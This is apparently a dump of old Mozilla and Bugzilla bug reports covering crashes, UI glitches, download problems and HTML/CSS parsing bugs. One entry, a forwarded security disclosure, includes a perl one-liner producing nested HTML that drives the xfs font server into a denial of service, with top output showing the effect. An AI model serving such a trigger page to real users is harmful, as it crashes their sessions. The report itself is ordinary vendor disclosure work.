BSD_waitevent  #2   0x9051576c in CarbonSelectThreadFunc  #3   0x90021428 in _pthread_body  Thread 3:  #0   0x9003f188 in semaphore_wait_signal_trap  #1   0x9003efa4 in _pthread_cond_wait  #2   0x9051dda0 in CarbonOperationThreadFunc  #3   0x90021428 in _pthread_body  Thread 4:  #0   0x90042d68 in semaphore_timedwait_signal_trap  #1   0x9003ef94 in _pthread_cond_wait  #2   0x90233470 in TSWaitOnSemaphoreCommon  #3   0x9023c298 in TimerThread  #4   0x90021428 in _pthread_body  Thread 5:  #0   0x9003f188 in semaphore_wait_signal_trap  #1   0x9003efa4 in _pthread_cond_wait  #2   0x90233454 in TSWaitOnSemaphoreCommon  #3   0x90248b2c in AsyncFileThread(void*)  #4   0x90021428 in _pthread_body  Thread 6:  #0   0x9003f188 in semaphore_wait_signal_trap  #1   0x9003efa4 in _pthread_cond_wait  #2   0x90525b90 in CarbonInetOperThreadFunc  #3   0x90021428 in _pthread_body  Thread 7:  #0   0x90074328 in mach_msg_trap  #1   0x90006670 in mach_msg  #2   0x928ec28c in JNI_CreateJavaVM_Impl  #3   0x928ec224 in JNI_CreateJavaVM_Impl  #4   0x928a51fc in JVM_GetClassMethodsCount  #5   0x90021428 in _pthread_body  Thread 8 Crashed:  #0   0x929ba640 in eh_rest_world_r10  #1   0x928322c8 in _mh_dylib_header  #2   0x92892920 in JVM_IsSameClassPackage  #3   0x928917f4 in JVM_MonitorNotifyAll  #4   0x92886e6c in JVM_SetThreadPriority  #5   0x92864964 in JVM_Send  #6   0x9290114c in JNI_CreateJavaVM_Impl  #7   0x928a51fc in JVM_GetClassMethodsCount  #8   0x90021428 in _pthread_body  Thread 9:  #0   0x90074328 in mach_msg_trap  #1   0x90006670 in mach_msg  #2   0x9283ddf4 in JVM_NewInstance  #3   0x92845d80 in JVM_ArrayCopy  #4   0x9285d620 in JVM_MonitorNotify  #5   0x9285e2f8 in JVM_MonitorWait  #6   0x05d9a678 in 0x5d9a678  #7   0x05d9868c in 0x5d9868c  #8   0x05d9868c in 0x5d9868c  #9   0xa2843c38 in typeinfo name for std::bad_exception  #10  0x92838bdc in JVM_CurrentTimeMillis  #11  0x92878c28 in JVM_FindClassFromClass  #12  0x92892c90 in JVM_IsSameClassPackage  #13  0x9288cf70 in JVM_GetMethodIxExceptionTableEntry  #14  0x928787a0 in JVM_FindClassFromClass  #15  0x928a51fc in JVM_GetClassMethodsCount  #16  0x90021428 in _pthread_body  Thread 10:  #0   0x90074328 in mach_msg_trap  #1   0x90006670 in mach_msg  #2   0x9283ddf4 in JVM_NewInstance  #3   0x92845d80 in JVM_ArrayCopy  #4   0x9285d620 in JVM_MonitorNotify  #5   0x9285e2f8 in JVM_MonitorWait  #6   0x05d9a678 in 0x5d9a678  #7   0x05d9868c in 0x5d9868c  #8   0x05d985cc in 0x5d985cc  #9   0x05d985cc in 0x5d985cc  #10  0xa2843c38 in typeinfo name for std::bad_exception  #11  0x92838bdc in JVM_CurrentTimeMillis  #12  0x92878c28 in JVM_FindClassFromClass  #13  0x92892c90 in JVM_IsSameClassPackage  #14  0x9288cf70 in JVM_GetMethodIxExceptionTableEntry  #15  0x928787a0 in JVM_FindClassFromClass  #16  0x928a51fc in JVM_GetClassMethodsCount  #17  0x90021428 in _pthread_body  Thread 11:  #0   0x90074328 in mach_msg_trap  #1   0x90006670 in mach_msg  #2   0x9283de9c in JVM_NewInstance  #3   0x92844e18 in JVM_GetClassLoader  #4   0x92844ba4 in JVM_GetClassLoader  #5   0x928a51fc in JVM_GetClassMethodsCount  #6   0x90021428 in _pthread_body  Thread 12:  #0   0x90074328 in mach_msg_trap  #1   0x90006670 in mach_msg  #2   0x9283ddf4 in JVM_NewInstance  #3   0x9285eb40 in JVM_FillInStackTrace  #4   0x92903300 in JVM_InitProperties  #5   0x92903138 in JVM_InitProperties  #6   0x928787a0 in JVM_FindClassFromClass  #7   0x928a51fc in JVM_GetClassMethodsCount  #8   0x90021428 in _pthread_body  Thread 13:  #0   0x90074328 in mach_msg_trap  #1   0x90006670 in mach_msg  #2   0x9283ddf4 in JVM_NewInstance  #3   0x9285eb40 in JVM_FillInStackTrace  #4   0x9288890c in JVM_StartThread  #5   0x92876c10 in JVM_FindLoadedClass  #6   0x928787a0 in JVM_FindClassFromClass  #7   0x928a51fc in JVM_GetClassMethodsCount  #8   0x90021428 in _pthread_body  PPC Thread State:   srr0: 0x929ba640 srr1: 0x0000f030                vrsave: 0x00000000    xer: 0x00000000   lr: 0x928322c8  ctr: 0x92842440   mq: 0x00000000     r0: 0x00000028   r1: 0xf04889e0   r2: 0x928322c8   r3: 0x6c0cbde0     r4: 0x6c0cbde0   r5: 0x00000015   r6: 0x00434278   r7: 0x6c500000     r8: 0xa28360b0   r9: 0x00000000  r10: 0x00000008  r11: 0x00000000    r12: 0x00000000  r13: 0xa2831c64  r14: 0xa28320ac  r15: 0xa2831fd0    r16: 0xa28320ac  r17: 0x00000003  r18: 0x00000001  r19: 0xa28320ac    r20: 0xa284dae8  r21: 0x6c0cbe00  r22: 0x0003ffb2  r23: 0x00000000    r24: 0x04fbad00  r25: 0x04fbad00  r26: 0xa284dae8  r27: 0x6c0cbdb8    r28: 0x6c4fffe8  r29: 0x6c0cbdb8  r30: 0x6c0cbde0  r31: 0x928320ac",Mozilla crashed after clicking on link [@ eh_rest_world_r10]
11872,"User-Agent:       Mozilla/5.0 (X11; U; FreeBSD i386; en-US; rv:1.3b) Gecko/20030117 Build Identifier: http://ftp.mozilla.org/pub/mozilla/nightly/latest/  If I enter the url of myy localhost ie. 127.0.0.1 or the ip address of my current machine ie. 10.0.0.1, and a webserver is defenitely running there, it won't connect. Also when teh dialog box comes up to ask whether to save the password, the dialog box is incomplete, only teh yes and no buttons show and not the ""never for this site"" nor the message text.  Reproducible: Always  Steps to Reproduce: 1.type in http://127.0.0.1 or http://yourhostname 2.go to a site where it will ask to save a username and password. 3.  Actual Results:   1 => the page won't load 2 => dialog box is incomplete  Expected Results:   1 => Page should load 2 => dialog box should be complete.",The browser won't load/connect to a page/host that is local
11917,"---------- Forwarded message ---------- Date: Mon, 17 Dec 2001 12:42:25 +0200 (EET) From: Mikko Rapeli <mikko.rapeli@iki.fi> To: security@xfree86.org, mozilla-security@mozilla.org Subject: xfs remote DoS with Mozilla  Hi!  I crashed my RedHat Linux 7.1 box once when viewing one of my handwritten web  pages, and after some debugging is seems that bad html on Mozilla starts xfs font server  spinning out of control. xfs eats all CPU time and memory after opening the page with Mozilla, which seems to be asking for larger and larger fonts.  Perhaps someone from xfree or mozilla lists can debug the details.  There is a bug in Mozilla when viewing this kind of page, but xfs still should not go crazy. I did not have time to install newer versions of Xfree, but  at least http://www.xfree.org/security/ does not show a fix for this.  Linux setup:  $ uname -a Linux lnx 2.4.2-2 #1 Sun Apr 8 20:41:30 EDT 2001 i686 unknown  $ X -version  XFree86 Version 4.0.3 / X Window System (protocol Version 11, revision 0, vendor release 6400) Release Date: 16 March 2001         If the server is older than 6-12 months, or if your card is         newer than the above date, look for a newer version before         reporting problems.  (See http://www.XFree86.Org/FAQ) Operating System: Linux 2.2.17-8smp i686 [ELF] Module Loader present  $ mozilla -version Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.6) Gecko/20011120, build  2001112012  $ mozilla -version Mozilla/5.0 (X11; N; Linux 2.4.2-2 i686), build 2001031614  The 'not-that-bad' html page:  $ perl -e 'print ""<HTML>"" x 1; print ""<BODY>"" x 1;print ""<CENTER><P><H3>A"" x  100; print ""</BODY>"" x 1;print ""</HTML>"" x 1'  top log: <snip>    4:07pm  up 23:08,  6 users,  load average: 0.02, 0.06, 0.02 1 processes: 1 sleeping, 0 running, 0 zombie, 0 stopped CPU states:  2.7% user,  0.8% system,  0.0% nice, 44.8% idle Mem:   125640K av,  122956K used,    2684K free,       0K shrd,    1604K buff Swap:  208804K av,   99844K used,  108960K free                   64972K cached   PID USER     PRI  NI  SIZE  RSS SHARE STAT %CPU %MEM   TIME COMMAND  1208 xfs        9   0 73100  27M 20948 S     0.0 22.4  17:18 xfs  1208 xfs        9   0 73100  27M 20948 S     0.0 22.4  17:18 xfs  1208 xfs       17   0 73100  30M 23816 D    45.3 24.5  17:19 xfs  1208 xfs       17   0 73100  27M 24080 D    30.0 22.1  17:20 xfs  1208 xfs       15   0 73056  31M 29092 D    15.1 25.7  17:20 xfs  1208 xfs       15   0 73056  34M 32284 D    12.1 28.3  17:20 xfs  1208 xfs       17   0 73056  39M 37056 D     6.6 32.1  17:20 xfs  1208 xfs       17   0 73056  42M 39852 D     2.4 34.3  17:20 xfs    4:08pm  up 23:09,  6 users,  load average: 0.54, 0.16, 0.05 1 processes: 1 sleeping, 0 running, 0 zombie, 0 stopped CPU states:  4.3% user,  7.1% system,  0.0% nice, 88.5% idle Mem:   125640K av,  122436K used,    3204K free,       0K shrd,     404K buff Swap:  208804K av,  114312K used,   94492K free                   63136K cached    PID USER     PRI  NI  SIZE  RSS SHARE STAT %CPU %MEM   TIME COMMAND  1208 xfs       17   0 73056  45M 43728 D     5.7 37.4  17:21 xfs  <had to killall mozilla-bin to avoid out-of-mem, snip>  It seems that neither xfs nor Mozilla have any real security holes, since Mozilla only asks for larger and larger fonts. However, this is way too easy to reproduce, and when the xfs dies the whole X session becomes unstable...  Regards, -Mikko",xfs remote DoS with Mozilla
11921,"User-Agent:       Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.2b) Gecko/20021007 Build Identifier: Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.2b) Gecko/20021007  Immediate crash loading http://geocities.com/moz_blubber - the moment it starts loading.  This is GeoCities, so who knows what crap they're loading onto the page ...  Reproducible: Always  Steps to Reproduce: 1. Go to http://geocities.com/moz_blubber 2. Crash!  Actual Results:   Crash  Expected Results:   Load page. Works fine in IE 5.5.  Crashes in 2002100704 and 2002100308.  Talkbacks from 2002100308: TB12198118X TB19198178G TB12198219Q  Talkback from 2002100704: TB12198718M",Immediate crash loading http://geocities.com/moz_blubber [@ nsView::ConvertFromParentCoords ][@ nsView::GetClippedRect]
12042,"From Bugzilla Helper: User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; .NET CLR  1.0.3705) BuildID:    RedHat Linux 7.3  mozilla crashes and closes without any worning when i tell it to visit these  pages: http://www.my-siemens.com/MySiemens/CDA/Index/0,2730,HQ_en_0_product%253AMW% 252FHD%252FHD%252FS45I%252Fdanda,FF.html  and   www.coolmobiles.com (in the account session, when trying to send sms)    Reproducible: Always Steps to Reproduce: 1.visit one of the above pages 2.it closes 3.",it justs closes when it visits these pages:
12099,"User-Agent:       Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.3) Gecko/20041125 Build Identifier: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.3) Gecko/20041125  This might be bug#180309, but it looks somewhat different. I have a Gentoo mozilla compiled from source.  I have no mention of any LineHeight method. The Testpage attachment#106556 from bug#180309 works fine for me.  The binary mozilla package of Ggentoo works, but fonts get not antialiased.  The stack trace looks like this: #0  0xffffe410 in ?? () #1  0xbfffc1fc in ?? () #2  0x4a448800 in ?? () from /lib/libc.so.6 #3  0xbfffc058 in ?? () #4  0x4a3c46e6 in nanosleep () from /lib/libc.so.6 #5  0x4a3c4504 in sleep () from /lib/libc.so.6 #6  0x0806b24f in ah_crap_handler(int) () #7  0xb6362315 in nsProfileLock::FatalSignalHandler(int) ()    from /usr/lib/mozilla/components/libprofile.so #8  <signal handler called> #9  0xb71813c9 in nsTextFrame::TextStyle::TextStyle(nsIPresContext*, nsIRenderingContext&, nsStyleContext*) () from /usr/lib/mozilla/components/libgklayout.so #10 0xb71756ea in nsTextFrame::GetLastInFlow() const ()    from /usr/lib/mozilla/components/libgklayout.so #11 0xb70fdfaf in nsContainerFrame::PaintChild(nsIPresContext*, nsIRenderingContext&, nsRect const&, nsIFrame*, nsFramePaintLayer, unsigned) ()    from /usr/lib/mozilla/components/libgklayout.so #12 0xb70e12c7 in nsBlockFrame::PaintChild(nsIPresContext*, nsIRenderingContext&, nsRect const&, nsIFrame*, nsFramePaintLayer, unsigned) ()    from /usr/lib/mozilla/components/libgklayout.so #13 0xb70f1ae7 in nsBlockFrame::GetDepth() const ()    from /usr/lib/mozilla/components/libgklayout.so   ldd /usr/lib/mozilla/components/libgklayout.so         linux-gate.so.1 =>  (0xffffe000)         libgkgfx.so => /usr/lib/mozilla/libgkgfx.so (0xb7748000)         libxpcom.so => /usr/lib/mozilla/libxpcom.so (0xb761b000)         libplds4.so => /usr/lib/mozilla/libplds4.so (0xb7617000)         libplc4.so => /usr/lib/mozilla/libplc4.so (0xb7612000)         libnspr4.so => /usr/lib/mozilla/libnspr4.so (0xb75d9000)         libpthread.so.0 => /lib/libpthread.so.0 (0xb75c8000)         libdl.so.2 => /lib/libdl.so.2 (0xb75c5000)         libmozjs.so => /usr/lib/mozilla/libmozjs.so (0xb7532000)         libgtk-x11-2.0.so.0 => /usr/lib/libgtk-x11-2.0.so.0 (0xb727d000)         libgdk-x11-2.0.so.0 => /usr/lib/libgdk-x11-2.0.so.0 (0xb720f000)         libatk-1.0.so.0 => /usr/lib/libatk-1.0.so.0 (0xb71f5000)         libgdk_pixbuf-2.0.so.0 => /usr/lib/libgdk_pixbuf-2.0.so.0 (0xb71e0000)         libpangoxft-1.0.so.0 => /usr/lib/libpangoxft-1.0.so.0 (0xb71db000)         libpangox-1.0.so.0 => /usr/lib/libpangox-1.0.so.0 (0xb71d0000)         libpango-1.0.so.0 => /usr/lib/libpango-1.0.so.0 (0xb719a000)         libgobject-2.0.so.0 => /usr/lib/libgobject-2.0.so.0 (0xb7165000)         libgmodule-2.0.so.0 => /usr/lib/libgmodule-2.0.so.0 (0xb7161000)         libglib-2.0.so.0 => /usr/lib/libglib-2.0.so.0 (0xb70e8000)         libm.so.6 => /lib/libm.so.6 (0xb70c7000)         libstdc++.so.5 => /usr/lib/gcc-lib/i686-pc-linux-gnu/3.3.4/libstdc++.so.5 (0xb6ffb000)         libgcc_s.so.1 => /usr/lib/gcc-lib/i686-pc-linux-gnu/3.3.4/libgcc_s.so.1 (0xb6ff1000)         libc.so.6 => /lib/libc.so.6 (0xb6ee7000)         /lib/ld-linux.so.2 => /lib/ld-linux.so.2 (0x80000000)         libX11.so.6 => /usr/X11R6/lib/libX11.so.6 (0xb6e21000)         libXrandr.so.2 => /usr/X11R6/lib/libXrandr.so.2 (0xb6e1d000)         libXi.so.6 => /usr/X11R6/lib/libXi.so.6 (0xb6e15000)         libXext.so.6 => /usr/X11R6/lib/libXext.so.6 (0xb6e06000)         libXft.so.2 => /usr/X11R6/lib/libXft.so.2 (0xb6df4000)         libfreetype.so.6 => /usr/lib/libfreetype.so.6 (0xb6d85000)         libXrender.so.1 => /usr/X11R6/lib/libXrender.so.1 (0xb6d7d000)         libfontconfig.so.1 => /usr/lib/libfontconfig.so.1 (0xb6d57000)         libXcursor.so.1 => /usr/X11R6/lib/libXcursor.so.1 (0xb6d4e000)         libpangoft2-1.0.so.0 => /usr/lib/libpangoft2-1.0.so.0 (0xb6d26000)         libexpat.so.0 => /usr/lib/libexpat.so.0 (0xb6d07000)         libz.so.1 => /lib/libz.so.1 (0xb6cf7000)   Reproducible: Always Steps to Reproduce: 1. Visit http://www.sparc.org/ 2. Wait till page is loaded 3. If mozilla is still alive, click ""Workstation""  Actual Results:   Mozilla crashes, if compiled without debug with Segfault, otherwise with something like this: UNKNOWN [/usr/lib/mozilla/components/libwidget_gtk2.so +0x00032B4E] nsWindow::OnExposeEvent(_GtkWidget*, _GdkEventExpose*)+0x00000113 [/usr/lib/mozilla/components/libwidget_gtk2.so +0x00024B15] UNKNOWN [/usr/lib/mozilla/components/libwidget_gtk2.so +0x00029164] Sleeping for 5 minutes. Type 'gdb /usr/lib/mozilla/mozilla-bin 8176' to attach your debugger to this thread.   Expected Results:   Page displayed.  I changed recently changed the following things: - transition from XFree86 to X.org - usage of native posix threads I recompiled mozilla after those changes  I have those relevant packages installed: - freetype-1.3.1 - freetype-2.1.9 (same thing with freetype-2.1.5) - xorg-x11-6.8.0",Mozilla crashes [@ nsTextFrame::TextStyle::TextStyle ]
12255,"Overview Description:    There's no Form and Image Manager submenus in Tasks > Privacy and Security  for subwindows like History, Manage Bookmarks, and Search Bookmarks/History  Steps to Reproduce:   1) Open the History, Manage Bookmarks or Search Bookmarks/History window.   2) Tasks > Privacy and Security  Actual Results:   Form Manager and Image Manager are missing (I don't think  Image Manager should be there in comm builds unless you have the pref enabled) Expected Results: Tasks > Privacy and Security should be the same throughout  the app, so those two submenus should be there.  Reproducibility: 100%  Build Date & Platform Bug Found:   just-pulled win98se  Additional Information:   There's presumably a missing overlay for these windows.",Form and Image Manager submenus missing in Tasks menu of subwindows
12375,"Hixie pointed this out to me  If all flags are disabled for a bug, then we still show the headers, even if the flag is not set (if it is set, then we should show the header)  The stuff in bug_form.pl needs to search for non-disabled flags, or disabled flags which are set when setting flag types.  I'm not sure if attachment flags have the same issue, but they probably do",flag table's header shown even if all flags are disabled
12412,User-Agent:       Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.2b) Gecko/20021022 Phoenix/0.3 Build Identifier: Moz 1.1  the menu which is pulled up by right-clicking a bookmark does not have it's hotkeys underlined.  Reproducible: Always  Steps to Reproduce: 1. 2. 3.,right-click menu in bookmark manager doesn't have underlined accesskeys (no mnemonics in personal toolbar)
12434,"User-Agent:       Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.6b) Gecko/20031212 Firebird/0.7+ (MozJF) Build Identifier: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.6b) Gecko/20031212 Firebird/0.7+ (MozJF)  Seems to be a recent regression (2 days ?).  It is simple to see. Grab latest nightly of firebird (11 december for now), go to this url, and download mozilla.exe full installer.  You will get this :  your target/mozilla-win32-1.5-installer.exe/mozilla-win32-1.5-installer.exe  Really annoying.  I saw this bug on a recent homemade build (based on sources up-to-date at midnight mozilla.org/time)  Reproducible: Always  Steps to Reproduce: 1.grab 11 december build 2.go to url 3.download installer.exe  Actual Results:   Directory with same file name.  Expected Results:   no directory.  Happens only with .exe file.  COuld it be related to bugfix for 214260 added on 10th december ?",Downloading creates a directory with the same name as downloaded file
12498,"From Bugzilla Helper: User-Agent: Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US; rv:1.0rc1) Gecko/20020417 BuildID:    2002041712  don't know how to describe this, but sometimes the curson just seems to stick to the page and when I move the cursor, the whole page will move with the cursor.  I can usually control click and unfreeze it.  It does not happen often.    I suspect it is my mistake -- hitting wrong combination of keys or by accidentally hitting the right click button (ctr. +click)  Reproducible: Didn't try Steps to Reproduce:",cursor sticks and drags page around
12524,"User-Agent:       Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.3) Gecko/20030312 Build Identifier: Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.3) Gecko/20030312  The Download Manager in Mozilla 1.3 does not close with either Command-W from the keyboard or with the choice of Close from the File menu.  It does close if you click on the red X close button.  Mac OS X 10.2.5, Mozilla 1.3 for Mac OS X.  Reproducible: Always  Steps to Reproduce: 1. Go to Tools, choose Download Manager. 2. Go to File, choose Close (nothing happens) 3. On the keyboard, hold down Command (open apple) and press the w key (nothing happens)  Actual Results:   Download Manager does not close.  Expected Results:   Download Manager should close.",Download Manager does not close with Command-W or File-Close
12534,"User-Agent:       Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1) Build Identifier: 0.6.1  Clicking URL's opens in already used windows. I'd like the option that exists in IE that makes clicking a URL open a NEW instance of Mozilla, not re-using a browser-window that is already in use.  Reproducible: Always  Steps to Reproduce: 1. Click URL in Eudora, ICQ, Whatever...  Actual Results:   Current pages opened in some Mozilla Browser window get's replaced by this URL.  Expected Results:   Opened a new Browser",Clicking URL's opens in already used windows
12579,"User-Agent:       Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7) Gecko/20040803 Firefox/0.8 Build Identifier: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7) Gecko/20040803 Firefox/0.8  Including this code <link  href="""" rel=""stylesheet"" type=""text/css"" /> in a page will make Firefox request the page URL again.   Reproducible: Always Steps to Reproduce: 1. Save out this code to a webserver under your control:  <html>   <head>     <title>Bug or feature?</title>     <link rel=""stylesheet"" type=""text/css"" href=""default.css"" title=""Default Style"" />     <link rel=""stylesheet"" type=""text/css"" href="""" title=""Re-requests page"" />   </head>   <body>     <p>Bug or feature?</p>   </body> </html>  2. Navigate to it with Firefox.  Actual Results:   Logfiles (and packet sniffers) show requests for foo.html, default.css, and then foo.html again.   Expected Results:   Browser should either detect that the URL has been loaded in this ""hit"" and parse the downloaded one (as it should if I were to include, in a single file, two CSS links to the same URL). OR it should detect that the link is empty and do nothing.",page gets requested twice on empty href in css link
12667,"User-Agent:       Mozilla/5.0 (Windows; U; Windows NT 5.0; en-US; rv:1.6b) Gecko/20031126 Build Identifier: Mozilla/5.0 (Windows; U; Windows NT 5.0; en-US; rv:1.6b) Gecko/20031126  The download speed status indicator does not update ! A download speed of 450 KB/sec  may show up as 150 KB/sec and NEVER updates. The progress bar is working in that same window but the ststus line information doesnt work properly.   Reproducible: Always  Steps to Reproduce: 1.Go to any site and click a download 2.select save to disk 3.Rename the file if you want 4.Click save 5.The next window shows the    Saving From: (location of file)    To: (location to save file)    Status: (file size info)(speed at KB/sec)    Time Left:    Time Elapsed:    Progress: (Graphic representation of download) 6. View download speed - Value initially displayed remains constant Actual Results:   Speed display is not updated after initial value is displayed  Expected Results:   Continuously update the display of download speed (KB/sec).  I have downloaded several files at over 450 KB/sec and the initial displayed speed was reported as anywhere from 103 to 180 KB/sec when the download started.  The initially displayed value for KB/sec does not change during a continuous download...  However...  IF...  I pause the download for several seconds and then resume the download, a new speed is displayed, but that new speed display is never updated either.",Download speed does not update
12678,"I noticed this morning this from mozilla.org sanitycheck.cgi:  Checking cached keywords   Bug(s) found with incorrect keyword cache: 46700, 47682, 48303, 50670, 50810, 50875, 51067, 51316, 51574, 51748, 51768, 52134, 52141, 52451, 52457, 52527, 52528, 52530, 52558, 52654, 52887, 52971, 53085, 53087, 53482, 54327, 54328, 55091, 55502, 55667, 56114, 56218, 56379, 56568, 57676, 58951, 58954, 59122, 59480, 59613, 59928, 59964, 61830, 63764, 64139, 64151, 65076, 8388607   At least the first one, probably most of these were due to a keyword rename.  It turns out editkeywords.cgi does not update the version cache of bugs when it renames a keyword.  As far as I can tell, show_bug doesn't use the version cache, so it's not terrible, but I presume queries use it.  I'm still looking at the last, illegal bug number.",Keyword cache not updated on keyword rename/delete (remove the keyword cache)
12704,User-Agent:       Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.5b) Gecko/20030827 Build Identifier: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.5b) Gecko/20030827  The mouse wheel does not work on the drop down history list.  When that list is open one cannot move the selection bar with the mouse wheel.  Reproducible: Always  Steps to Reproduce: 1. 2. 3.,mouse wheel and drop down history list
12830,Reproducible: Always Steps to Reproduce: 1.1.Help Contents is chosen from the Help menu. 2.A browser window is clicked.  Actual Results: A browser window does not become active.  Expected Results: A browser window does become active.  Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; ja-JP; rv:1.7b) Gecko/20040312 Firefox/0.8.0+,A browser window cannot be made active when a Help window is displayed.
13086,"User-Agent:       Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; .NET CLR 1.1.4322) Build Identifier: Bugzilla Version 2.16.4  This page has a ""Send Mail to Bug Owners"" link that doesn't seem to work with  multiple addresses.  The problem seems to be that a comma is used instead of a  semi-colon. FROM: <a  href=""mailto:aaa@widget.com,bbb@widget.com,ccc@widget.com,ddd@widget.com"">Send  Mail to Bug Owners</a>  TO: <a  href=""mailto:aaa@widget.com;bbb@widget.com;ccc@widget.com;ddd@widget.com"">Send  Mail to Bug Owners</a>  I am using Micro$oft Outlook 2000 SP3.  Reproducible: Always Steps to Reproduce: 1. Make a query with multiple people on the list 2. press ""Send Mail to Bug Owners"" Actual Results:   all of the email addresses munged together  Expected Results:   an email addressed to all bug owners on the list","""Mail to bug owners"" link doesn't work properly with Outlook"
13124,"User-Agent:       Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8a5) Gecko/20041020 Firefox/0.9.1+ Build Identifier: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8a5) Gecko/20041020 Firefox/0.9.1+  If I follow a link that contains an anchor which is to be found in a nested table, it is displayed outside the view area.  It happens only if I click this link for the first time. If I go back and click the link again, it stays in the right position, as well as if I enter the target URL directly.   Reproducible: Sometimes Steps to Reproduce: 1. http://karlsruhe.feg.de/ 2. Click ""Samstag, 6. November"" near the flag (it is the link http://karlsruhe.feg.de/myfeg/index.php?html_seite=14#20041106 ).   Actual Results:   The subsequent page appeared in the right position, but only for a short time - then it scrolled down one table row, which makes the anchor position disappear.  Expected Results:   Show the desired table row, described by the anchor, within the view area - and stay there.  The page also contains an auto-scrolling menu, maybe it has to do with that.",wrong scroll position for an anchor within a table
13198,"User-Agent:       Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7 Build Identifier: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7      Reproducible: Always  Steps to Reproduce: 1. ""c:\program files\mozilla firefox\firefox.exe"" ""www.google.com""   - this opens a new window for Google. 2. ""c:\program files\mozilla firefox\firefox.exe"" ""http://www.google.com""   - this opens google in my current window. 3. ""c""\program files\mozilla firefox\firefox.exe"" ""google.com""   - This opens google in a new window.   Expected Results:   Firefox should open the URL in the same window as expected. If this should not be the case, firefox should be consistant enough to open the URL in a new window.  Window behaviour for ""www.site.com"" and ""http://site.com"" should be identical.","[firefox.exe ""url.com""] opens new window, [firefox.exe ""http://url.com""] opens in current window"
13220,"User-Agent:       Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8) Gecko/20051107 Firefox/1.5 Build Identifier: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8) Gecko/20051107 Firefox/1.5  list-style-image CSS property works perfect with a number of image formats: list-style-image: url(/images/my_image.png); list-style-image: url(/images/my_image.gif); ...  Yet it does not work with svg images.  list-style-image: url(/images/my_image.svg);  Tested with FireFox 1.5 RC2  Reproducible: Always  Steps to Reproduce: 1. Create an image 2. Save as .png and as .svg 3. Create a document with <ul> and some <li> tags 4. Create a CSS stylesheet with an ul.list-style-image property 5. Assign ""url(/images/my_image.png)"" value to the list-style-image property 6. View page 7. Assign ""url(/images/my_image.svg)"" value to the list-style-image property 8. View page  Actual Results:   In step 6. the list-style-image is properly applied In step 8. the list-style-image is NOT applied at all.  Expected Results:   It should have applied the list-style-image property as incicated.  Probably this is just enabling svg image hendling for this property.",No SVG support when using list-style-image CSS property
13278,"User-Agent:       Mozilla/5.0 (X11; U; Linux i686; he; rv:1.8.0.1) Gecko/20060124 Firefox/1.5.0.1 Build Identifier: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.0.4) Gecko/20060508 Firefox/1.5.0.4  Some (all?) HTML comments that contain the text ""--"" force Firefox to display the comments in the webpage. For instance: ""<p>Hello <!-- fucking --> World</p>"" Produces: ""Hello World""  However,""<p>Hello <!-- Big -- Bad --> World</p>"" Produces: ""Hello <!-- Big -- Bad --> World""   Reproducible: Always  Steps to Reproduce: 1.Create page with HTML comment that includes ""--"" within the comment 2.Display page in Fx  Actual Results:   The text ""Hello <!-- Big -- Bad --> World"" was displayed in the browser.    Expected Results:   The browser should have displayed ""Hello World"".  The bug was confirmed by others, as you can see on this page: http://www.siteexperts.com/forums/viewConverse.asp?d_id=19226","Text ""--"" in HTML comments forces browser to display the comments in webpage."
13363,"User-Agent:       Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1) Gecko/20061024 Iceweasel/2.0 (Debian-2.0+dfsg-1) Build Identifier: Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1) Gecko/20061024 Iceweasel/2.0 (Debian-2.0+dfsg-1)  Consider the following example:  <script type=""text/javascript"" src=""foo.js""/> <script type=""text/javascript"">     alert(""Bar!"") </script>  With that script present in the page, one would expect (I should think) to receive a Javascript alert dialog.  One does not.  The script specified by the self-terminating tag is sourced but the script in the tag following it is not.  However,  <script type=""text/javascript"" src=""foo.js""></script> <script type=""text/javascript"">     alert(""Bar!"") </script>  works as expected.  Reproducible: Always  Steps to Reproduce: See ""Details"" section. Actual Results:   The second script tag's contents were apparently not sourced; no alert dialog appeared.  Expected Results:   I expected that the alert dialog would appear.  I skimmed the HTML 4.01 standard and could not find any rules specifying that certain tags should not be self-terminated.  The standard does state, however, that any number of script tags in a document is legal.  It bears mentioning that Firefox 2.0, IE6, and IE7 all exhibit this behavior, but Konqueror v3.5.5 does not (the self-terminating tag behaves the same as the normal tag).  While this particular problem is not catastrophic by any stretch of the imagination, it did cause me almost an hour of irritating head-scratching.  :)  Thanks for your time.",Script tags cease to function as expected after a self-terminating script tag.
